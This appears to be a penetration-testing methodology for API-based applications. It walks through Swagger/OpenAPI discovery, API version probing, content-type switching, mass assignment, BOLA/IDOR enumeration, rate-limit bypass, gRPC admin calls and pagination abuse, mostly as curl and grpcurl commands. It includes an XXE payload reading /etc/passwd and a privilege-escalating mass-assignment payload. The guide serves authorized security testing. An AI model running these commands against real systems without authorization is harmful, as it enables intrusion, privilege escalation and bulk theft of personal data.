# API-First Testing Methodology

Structured approach for testing modern API-based applications where there's minimal traditional web UI. Covers REST, GraphQL, and gRPC endpoints in microservice architectures.

## When to Use

- Target is primarily API-based (microservices, mobile backend)
- Minimal or no traditional web UI (SPA frontend only)
- Swagger/OpenAPI specs available or discoverable
- GraphQL or gRPC endpoints discovered
- Spring Boot / Node.js / Go microservices behind API gateway

## API Discovery Hierarchy

Ordered by information richness (try top-down):

| Priority | Source | What It Reveals |
|---|---|---|
| 1 | OpenAPI/Swagger spec | Complete endpoint list, parameters, schemas, auth requirements |
| 2 | GraphQL introspection | Full type system, queries, mutations, subscriptions |
| 3 | /actuator/mappings | All registered URL handlers (Spring Boot) |
| 4 | API documentation pages | Human-readable endpoint docs |
| 5 | JS bundle extraction | Client-side API calls, endpoints, auth flow |
| 6 | WADL/WSDL | SOAP service definitions |
| 7 | Traffic analysis | Actual API calls in use |
| 8 | API-specific brute-force | Kiterunner, API wordlists |

## OpenAPI/Swagger-Driven Testing

### Extracting the Spec

```bash
# Common Swagger/OpenAPI paths (test with and without auth)
SPEC_PATHS=(
  "/v3/api-docs"
  "/v2/api-docs"
  "/swagger.json"
  "/openapi.json"
  "/openapi.yaml"
  "/api-docs"
  "/swagger-resources"
  "/swagger-ui/index.html"
  "/docs"
  "/redoc"
  "/.well-known/openapi.json"
)

for path in "${SPEC_PATHS[@]}"; do
  UNAUTH=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${path}")
  AUTH=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://target.com${path}")
  [ "$UNAUTH" != "404" ] || [ "$AUTH" != "404" ] && echo "  ${path} → unauth:${UNAUTH} auth:${AUTH}"
done

# Per-service specs (microservice architecture)
for svc in bpm customer agreement master notification; do
  curl -sk "https://target.com/${svc}/v3/api-docs" -o "${svc}-api-docs.json" 2>/dev/null
  [ -s "${svc}-api-docs.json" ] && echo "[+] Got spec for: ${svc}"
done
```

### Spec Analysis — What to Extract

```bash
# Parse OpenAPI spec for security-relevant information
cat api-docs.json | jq '{
  servers: .servers,
  total_endpoints: ([.paths | to_entries[] | .value | keys[]] | length),
  auth_schemes: .components.securitySchemes,
  endpoints_without_security: [.paths | to_entries[] | {path: .key, methods: (.value | to_entries[] | select(.value.security == null or (.value.security | length) == 0) | .key)}]
}'
```

**Key things to look for in the spec:**
- Endpoints with NO security requirement (missing `security: []`)
- Deprecated endpoints (`deprecated: true`) — often less secured
- Internal endpoints (`x-internal: true`, `x-hidden: true`)
- Server URLs revealing internal/staging hosts
- Parameter constraints (min/max) — test boundary values
- Response schemas showing sensitive fields (password_hash, ssn, etc.)
- Different auth schemes per endpoint (some may use weaker auth)

### Endpoint Extraction Script

```python
#!/usr/bin/env python3
"""Extract and categorize endpoints from OpenAPI spec for testing."""
import json
import sys

with open(sys.argv[1]) as f:
    spec = json.load(f)

print("=" * 60)
print(f"API: {spec.get('info', {}).get('title', 'Unknown')}")
print(f"Version: {spec.get('info', {}).get('version', 'Unknown')}")
print("=" * 60)

# Extract all endpoints
endpoints = []
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ('get', 'post', 'put', 'patch', 'delete'):
            has_auth = bool(details.get('security') or spec.get('security'))
            deprecated = details.get('deprecated', False)
            params = [p['name'] for p in details.get('parameters', [])]
            endpoints.append({
                'method': method.upper(),
                'path': path,
                'auth': has_auth,
                'deprecated': deprecated,
                'params': params,
                'tags': details.get('tags', []),
                'summary': details.get('summary', '')
            })

# Print categorized
print(f"\nTotal endpoints: {len(endpoints)}")

no_auth = [e for e in endpoints if not e['auth']]
if no_auth:
    print(f"\n🔴 NO AUTH REQUIRED ({len(no_auth)}):")
    for e in no_auth:
        print(f"  {e['method']:6} {e['path']}")

deprecated = [e for e in endpoints if e['deprecated']]
if deprecated:
    print(f"\n⚠️  DEPRECATED ({len(deprecated)}):")
    for e in deprecated:
        print(f"  {e['method']:6} {e['path']}")

# Endpoints with ID parameters (IDOR candidates)
idor = [e for e in endpoints if '{' in e['path']]
if idor:
    print(f"\n🎯 IDOR CANDIDATES ({len(idor)}):")
    for e in idor:
        print(f"  {e['method']:6} {e['path']}")

# Write/delete endpoints (privilege escalation candidates)
writes = [e for e in endpoints if e['method'] in ('POST', 'PUT', 'PATCH', 'DELETE')]
if writes:
    print(f"\n✏️  WRITE ENDPOINTS ({len(writes)}):")
    for e in writes:
        print(f"  {e['method']:6} {e['path']}")

# Generate curl test commands
print("\n\n# === Test Commands ===")
for e in endpoints:
    if not e['auth']:
        print(f"curl -sk -X {e['method']} \"https://TARGET{e['path']}\" -w \" [%{{http_code}}]\\n\"")
```

---

## API Versioning Exploitation

### Version Discovery

```bash
# If /api/v2/users exists, try older/newer versions
KNOWN_PATH="/api/v2/users"
BASE=$(echo "$KNOWN_PATH" | sed 's/v[0-9]*//')

for v in v0 v1 v2 v3 v4 v5; do
  VERSIONED="${BASE}${v}/users"
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${VERSIONED}")
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [${CODE}] ${VERSIONED}"
done

# Also try without version prefix
curl -sk -o /dev/null -w "%{http_code}" "https://target.com/api/users"

# Try version in header instead of path
curl -sk -H "Api-Version: 1" -H "Authorization: Bearer $TOKEN" "https://target.com/api/users" -w " [%{http_code}]\n"
curl -sk -H "Accept: application/vnd.api.v1+json" -H "Authorization: Bearer $TOKEN" "https://target.com/api/users" -w " [%{http_code}]\n"
```

### Common Version-Based Vulnerabilities

| Pattern | Test | Impact |
|---|---|---|
| v1 has no auth, v2 requires auth | Access v1 directly | Auth bypass (Critical) |
| v1 returns more fields than v2 | Compare response schemas | Data exposure (Medium-High) |
| v1 accepts extra parameters | Mass assignment on v1 | Privilege escalation (High) |
| v1 has no rate limiting | Brute-force via v1 | Rate limit bypass (Medium) |
| Deprecated version has known CVEs | Check CVE databases | Depends on CVE |

```bash
# Compare v1 vs v2 response (look for extra fields in older version)
diff <(curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users/me" | jq 'keys' | sort) \
     <(curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v2/users/me" | jq 'keys' | sort)
# Extra fields in v1 = data exposure finding
```

---

## Content-Type Manipulation

```bash
ENDPOINT="https://target.com/api/v1/data"
DATA='{"name":"test","value":"probe"}'

# Standard JSON
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/json" -d "$DATA" -w " [json: %{http_code}]\n"

# XML (may trigger XXE if XML parser is loaded)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>' \
  -w " [xml: %{http_code}]\n"

# Form-urlencoded (may bypass JSON-only validation)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&value=probe" -w " [form: %{http_code}]\n"

# Multipart (may bypass file upload restrictions)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: multipart/form-data" \
  -F "name=test" -F "value=probe" -w " [multipart: %{http_code}]\n"

# Charset variations
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/json; charset=utf-16" -d "$DATA" -w " [utf16: %{http_code}]\n"
```

**Interpretation:**
- Different status codes = server processes different content types differently
- 500 on XML = XML parser exists but choked (try XXE)
- 200 on form-urlencoded when JSON is expected = validation bypass opportunity

---

## API-Specific Attack Patterns

### Mass Assignment

```bash
# Step 1: Find writable endpoints (PUT/PATCH)
# Step 2: Get current object to see all fields
CURRENT=$(curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users/me")
echo "$CURRENT" | jq 'keys'

# Step 3: Try adding fields that shouldn't be writable
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://target.com/api/v1/users/me" \
  -d '{
    "name": "legitimate-update",
    "role": "admin",
    "is_admin": true,
    "is_verified": true,
    "credit_limit": 999999999,
    "permissions": ["*"],
    "group_id": 1,
    "organization_id": "other-org"
  }'

# Step 4: Verify if any extra fields were accepted
AFTER=$(curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users/me")
diff <(echo "$CURRENT" | jq .) <(echo "$AFTER" | jq .)
```

### BOLA (Broken Object Level Authorization)

```bash
# Systematic IDOR testing across all endpoints with ID parameters
# Extract IDs from your own data first
MY_DATA=$(curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users/me")
MY_ID=$(echo "$MY_DATA" | jq -r '.id')
MY_ORG=$(echo "$MY_DATA" | jq -r '.organization_id')

# Try adjacent/other IDs
OTHER_IDS=("1" "2" "0" "999" "$((MY_ID - 1))" "$((MY_ID + 1))")

for id in "${OTHER_IDS[@]}"; do
  [ "$id" = "$MY_ID" ] && continue
  RESP=$(curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users/${id}")
  CODE=$(echo "$RESP" | head -1)
  [ "$(echo "$RESP" | jq -r '.id' 2>/dev/null)" != "null" ] && echo "[!] IDOR: /users/${id} returned data"
done
```

### Excessive Data Exposure

```bash
# Compare what the API returns vs what the UI shows
# API may return sensitive fields that the frontend filters client-side

curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users/me" | \
  jq 'keys' | grep -iE "(password|hash|secret|ssn|credit|internal|private|token)"

# Check list endpoints for over-exposure
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users" | \
  jq '.[0] | keys' | grep -iE "(email|phone|address|dob|salary|score)"
# If list endpoint returns PII of other users → finding
```

### Rate Limiting Analysis

```bash
# Test rate limits per endpoint (financial APIs should ALL have rate limits)
ENDPOINT="https://target.com/api/v1/transactions"

echo "=== Rate Limit Test: $ENDPOINT ==="
for i in $(seq 1 50); do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$ENDPOINT")
  echo -n "$CODE "
  [ "$CODE" = "429" ] && echo -e "\n[+] Rate limited at request #$i" && break
done

# If no 429 after 50 requests → no rate limiting (finding for financial APIs)
# Test bypass via X-Forwarded-For
for i in $(seq 1 20); do
  curl -sk -o /dev/null -w "%{http_code} " \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    "$ENDPOINT"
done
```

---

## gRPC Testing

### Discovery

```bash
# Check for gRPC reflection (equivalent of swagger for gRPC)
# Install: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# With TLS
grpcurl target.com:443 list
grpcurl target.com:443 describe

# Without TLS (internal services)
grpcurl -plaintext target.com:50051 list

# Common gRPC ports
for port in 443 8443 9090 50051 50052; do
  grpcurl -connect-timeout 3 target.com:$port list 2>/dev/null && echo "[+] gRPC on port $port"
done

# Check if gRPC-Web is exposed (browser-accessible via HTTP)
curl -sk -X POST "https://target.com/grpc.health.v1.Health/Check" \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" -w " [%{http_code}]\n"
```

### gRPC-Specific Attacks

```bash
# List all services (if reflection enabled)
grpcurl target.com:443 list
# Output: com.example.UserService, com.example.AdminService, ...

# Describe a service (get all methods)
grpcurl target.com:443 describe com.example.UserService

# Call a method without auth
grpcurl -d '{"user_id": "1"}' target.com:443 com.example.UserService/GetUser

# Call with auth
grpcurl -H "Authorization: Bearer $TOKEN" \
  -d '{"user_id": "1"}' target.com:443 com.example.UserService/GetUser

# Try admin services with regular token
grpcurl -H "Authorization: Bearer $TOKEN" \
  target.com:443 com.example.AdminService/ListUsers
```

---

## Pagination & Bulk Data Extraction

```bash
# Test pagination limit override
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=1" | jq 'length'
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=100" | jq 'length'
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=10000" | jq 'length'
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=-1" | jq 'length'
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=0" | jq 'length'

# Check if total count is exposed (reveals data volume even without full access)
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=1" | \
  jq '.total, .count, .total_count, .totalElements, .totalRecords'

# Test negative/large offsets
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?offset=-1" | jq 'length'
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?page=0&size=2147483647" | jq 'length'
```

**Findings:**
- No pagination limit (can dump all records) → Medium-High (data exposure at scale)
- Total count exposed without data → Low-Medium (information disclosure)
- Negative offset returns different data → investigate further

---

## Integration with ptest Phases

| Phase | API-Specific Actions |
|---|---|
| Phase 1 (Passive Recon) | Discover API specs from JS bundles, documentation sites |
| Phase 2 (Active Recon) | Port scan for non-standard API ports (8080, 8443, 9090, 50051) |
| Phase 3 (Enumeration) | Parse specs, enumerate all endpoints, test auth per endpoint, Kiterunner |
| Phase 4 (Attack Surface) | Map API surface with auth requirements matrix, prioritize by data sensitivity |
| Phase 5 (Vuln Assessment) | Version testing, content-type manipulation, rate limit analysis |
| Phase 6 (Exploitation) | BOLA, mass assignment, privilege escalation, data exposure, gRPC abuse |
| Phase 7 (Post-Exploitation) | Document data access scope, pagination abuse for volume assessment |

---

## Tools

| Tool | Purpose | Install |
|---|---|---|
| Kiterunner | API-aware content discovery (knows REST patterns) | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
| grpcurl | gRPC CLI testing | `go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest` |
| Arjun | Parameter discovery | `pip3 install arjun` |
| Schemathesis | Property-based testing from OpenAPI specs | `pip3 install schemathesis` |
| openapi-generator | Generate client SDKs from specs | `brew install openapi-generator` |

### Kiterunner Usage

```bash
# API-aware brute-force (much better than gobuster for APIs)
kr scan https://target.com -w ~/kiterunner-wordlists/routes-large.kite \
  -H "Authorization: Bearer $TOKEN" \
  --fail-status-codes 404,401

# With OpenAPI spec as input (tests all spec endpoints)
kr scan https://target.com -w api-docs.json \
  -H "Authorization: Bearer $TOKEN"
```

### Schemathesis Usage

```bash
# Automated property-based testing from OpenAPI spec
schemathesis run https://target.com/v3/api-docs \
  -H "Authorization: Bearer $TOKEN" \
  --checks all \
  --hypothesis-max-examples 50

# This automatically:
# - Tests boundary values for all parameters
# - Sends invalid types (string where int expected)
# - Tests required vs optional parameters
# - Checks response schema compliance
```
